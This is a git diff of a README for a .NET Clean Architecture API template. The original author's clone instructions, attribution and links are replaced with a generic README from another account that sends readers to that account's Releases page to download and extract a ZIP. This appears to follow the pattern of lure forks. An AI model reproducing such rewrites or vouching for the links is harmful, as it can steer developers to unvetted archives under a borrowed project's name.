@@ -1,149 +1,95 @@
-![Stars](https://img.shields.io/github/stars/safwancicem85/dotnet-clean-architecture-template?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
-![Version](https://img.shields.io/badge/version-v1.0.0-blue?style=flat-square)
-
-# RapidStart .NET Blueprint  
-**Production-Ready Clean Architecture Starter for Enterprise-Grade APIs**
-
-A streamlined, professional, and highly extensible .NET Clean Architecture template designed for developers who want to skip the setup phase and build production-ready APIs from day one.
-
-This template blends **enterprise architecture standards** with **fast developer onboarding**, making it ideal for teams, freelancers, and solo engineers who value reliability, structure, and development speed.
-
----
-
-## 🔥 Why RapidStart .NET Blueprint?
-Stop wasting days setting up architecture.
-
-### ✅ **Start Coding Immediately**  
-Stop wasting days on bootstrapping projects. Everything is already wired, organized, and ready for feature development.
-
-### ✅ **Enterprise-Grade Clean Architecture**  
-Layered, scalable, and maintainable structure trusted by engineering teams across industries.
-
-### ✅ **Consistency for Teams & Freelancers**  
-Perfect for starting client projects with a clean, professional baseline.
-
-### ✅ **Fully Documented**  
-Detailed explanations and examples that make onboarding smooth even for junior developers.
-
----
-
-## 🏗️ Architecture Overview
-
-This template follows a **Clean Architecture** style using clear boundaries:
-
-<img width="959" height="445" alt="image" src="https://github.com/user-attachments/assets/4708b527-fd27-400e-be68-3ce630f9a0f4" />
-
-Clean boundaries. No accidental cross-references. Easy to test. Enterprise-ready.
-
----
-
-## ✨ Key Features
-
-### 🧩 **Generic Controller & Service Layer (CRUD-Ready)**  
-Flexible services without forcing a fixed CRUD boilerplate.
-
-### 🗃 **EF Core Integration + Migrations**  
-Database setup included — ready to run out of the box.
-
-### 🧱 **Clean Separation of Concerns**  
-Improves maintainability and long-term scalability.
-
-### 📦 **Layered Architecture With DDD-Ready Structure**  
-You can grow the project into more advanced domain-driven architecture over time.
-
-### 📘 **Full Documentation**  
-Includes examples to guide you on implementing features correctly and consistently.
-
----
+# 🌟 dotnet-clean-architecture-template - A Simple Starter for Web APIs
 
 ## 🚀 Getting Started
 
-### **1. Clone the repo**
+Welcome to the dotnet-clean-architecture-template! This template provides a solid foundation for building web APIs using .NET. You can quickly set up a project that follows best practices and clean code patterns.
 
-```bash
-git clone https://github.com/safwancicem85/dotnet-clean-architecture-template.git
-```
+## 📥 Download & Install
 
-### **2. Restore dependencies**
+To get started, visit this page to download the latest version of the template:
 
-```bash
-dotnet restore
-```
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/releases)
 
-### **3. Apply migrations**
+### 📋 System Requirements
 
-```bash
-dotnet ef database update
-```
+Before you proceed, ensure that your computer meets the following minimum requirements:
 
-### **4. Run the API**
+- **Operating System:** Windows 10, macOS, or Linux
+- **.NET SDK:** Version 6.0 or later. You can download it from the official [.NET website](https://dotnet.microsoft.com/download).
+- **IDE:** Any text editor or Integrated Development Environment (IDE) that supports .NET development, such as Visual Studio or Visual Studio Code.
 
-```bash
-dotnet run --project src/Presentation
-```
+## 🔧 Running the Application
 
-Your API is now live.
+Follow these steps to run the application locally:
 
----
+1. **Download the Template:**
+   Visit the Releases page to download the template files. You can find the latest version [here](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/releases).
 
-## 📁 Project Structure
+2. **Extract the Files:**
+   Once downloaded, extract the ZIP file to your preferred location on your computer.
 
-```
-/src
-  /API
-  /Application
-  /Infrastructure
-  /Domain
-  /Common
-/docs
-/tests
-```
+3. **Open the Project:**
+   Launch your chosen IDE and open the folder where you extracted the files.
 
-Each layer isolated. Each responsibility clear.
+4. **Restore Dependencies:**
+   Open a terminal or command prompt in the project folder. Run the following command to restore necessary packages:
+   ```bash
+   dotnet restore
+   ```
 
----
+5. **Build the Project:**
+   Next, build the project by running:
+   ```bash
+   dotnet build
+   ```
 
-## 🧪 Testing
+6. **Run the Application:**
+   Finally, start the application using this command:
+   ```bash
+   dotnet run
+   ```
+   After a few moments, your API will be up and running. You can access it via your web browser or any REST client at `http://localhost:5000`.
 
-Testing framework support included.  
-Extend as needed for domain, application, and integration tests.
+## 🛠️ Features
 
----
+This template comes with several built-in features to help you get started:
 
-## 📈 Ideal For:
+- **Layered Architecture:** The project is structured to separate concerns, making it easier to maintain and scale.
+- **Entity Framework Core:** A powerful ORM for interacting with databases.
+- **CRUD Operations:** Basic Create, Read, Update, and Delete operations are set up.
+- **REST API Setup:** An initial RESTful API structure is ready for use.
+- **Documentation:** Detailed explanations and usage instructions are included throughout the code.
 
-- Freelancers delivering fast, high-quality client APIs  
-- Startups needing a clean and maintainable baseline  
-- Teams onboarding new developers  
-- Enterprise apps requiring long-term scalability  
-- Anyone who wants to avoid boilerplate setup  
+## 📚 Documentation
 
----
+For more detailed guidance, the documentation is available within the project files. It covers topics such as:
 
-## ⚙ Preview (Lite version)
-This is preview purpose only template, find the ready template on link below
+- Architecture overview
+- Configuration options
+- How to extend functionality
+- Best practices for using the template
 
-## 🔗 Upgrade to the Full Version
+Feel free to refer to the documentation as needed!
 
-If you want a **more advanced, production-enhanced version** of this template — including improved documentation, best practices, extended setups, and additional patterns — you can get the full version here:
+## 🌍 Topics Covered
 
-👉 **RapidStart .NET Blueprint (Gumroad)**  
-[RapidStart .NET Blueprint](https://cicem.gumroad.com/l/rapidstart-net-blueprint "Named link title")
+This project is relevant to various topics, making it a useful resource for different types of developers:
 
-This supports my work and helps me build more tools for the .NET community.
+- api-template
+- asp-net-core
+- best-practices
+- boilerplate
+- crud-api
+- csharp
+- ddd-example
+- efcore
+- entity-framework-core
+- rest-api
 
----
+You can explore more about these topics to enhance your understanding of the framework and architecture.
 
-## ⭐ Support & Contribution
+## 💬 Support
 
-If this repo helps you, please **star** ⭐️ the repository.  
-Contributions, issues, and suggestions are always welcome.
+If you encounter issues or need support, you can open an issue on the [GitHub page](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/issues). The community and maintainers are here to help.
 
----
-
-## 📬 Contact
-
-For custom .NET development, freelancing, or consulting:  
-**Cicem — Engineering**  
-(Open for client projects)
+By following these steps, you can easily download and run the dotnet-clean-architecture-template on your machine. Enjoy building your web APIs!
